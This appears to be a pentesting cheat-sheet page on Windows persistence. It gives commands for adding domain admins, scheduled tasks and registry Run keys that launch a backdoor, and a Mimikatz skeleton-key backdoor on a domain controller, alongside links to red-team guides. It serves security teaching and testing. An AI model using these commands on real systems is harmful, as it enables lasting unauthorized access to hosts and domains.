# Windows

## Guides

3 good guides:

{% embed url="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-1-microsoft-office/" %}

{% embed url="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/" %}

{% embed url="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/" %}

## Add User

Commands: 

`net user "username" "password" /ADD` 

`net group "Domain Admins" %username% /DOMAIN /ADD` 

Change user password 

`net user USERNAME *` 

Using Powershell:

`Add-LocalGroupMember -Group Administrators -Member hacker`

## Scheduled task

### SharpPresist

[https://github.com/fireeye/SharPersist](https://github.com/fireeye/SharPersist) 

Create a Scheduled task: 

`Execute-assembly ~/Downloads/SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c echo 123 >> c:\123.txt" -n "Some Task" -m add -o hourly` 

Or 

`SharPersist -t schtask -c "C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe" -a "C:\Users\John\msbuild.csproj" -n "Test" -m add -o hourly` 

Delete a Scheduled task: 

`SharPersist -t schtask -n "Test" -m remove` 

### PowerShell 

```text
PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe" 
PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta" 
PS C:\> $P = New-ScheduledTaskPrincipal "Rasta" 
PS C:\> $S = New-ScheduledTaskSettingsSet 
PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S 
PS C:\> Register-ScheduledTask Backdoor -InputObject $D 
```

### Command Line 

`shell schtasks /create /tn Test /tr "c:\windows\system32\cmd.exe /c c:\Users\JOHN\Downloads\backdoor.exe" /sc onlogon /ru System` 

## Registry Key

### SharpPresist: 

[https://github.com/fireeye/SharPersist](https://github.com/fireeye/SharPersist) 

Create a Registry Key: 

`SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add` 

Delete a Registry Key: 

`SharPersist -t reg -k "hkcurun" -v "Test Stuff" -m remove` 

### Command Line 

`shell reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Test /t REG_SZ /d "C:\Windows\System32\cmd.exe"` 

Delete: 

`reg delete  Registry_key_path /v Registry_value_name` 

## Accessibility Features

The accessibility features provide additional options \(on screen keyboards, magnifier, screen reading etc.\) that could assist people with disabilities to use Windows operating systems easier. However, this functionality can be abused to achieve persistence on a host that RDP is enabled and Administrator level privileges have been obtained. This technique touches the disk, or modification of the registry is required to execute a stored remotely payload. 

{% embed url="https://pentestlab.blog/2019/11/13/persistence-accessibility-features/" %}

## Silver Tickets

Computers change their account passwords every 30 days, but this is initialized by the client, not Active Directory. extract the host computer account hash, set a specific registry key, and you can regain access indefinitely. 

## Skeleton Key

The method injects itself into LSASS and creates a master password that will work for any account in the domain.

* The Skeleton Key only works for Kerberos RC4 encryption
* The Skeleton Key is a backdoor that runs on the Domain Controller \(in memory\) allows single password \(the skeleton password\) that can be used to log on to any account;

Run it on a DC using Mimikatz:

```text
privilege::debug
misc::skeleton
```

[https://pentestlab.blog/2018/04/10/skeleton-key/](https://pentestlab.blog/2018/04/10/skeleton-key/)

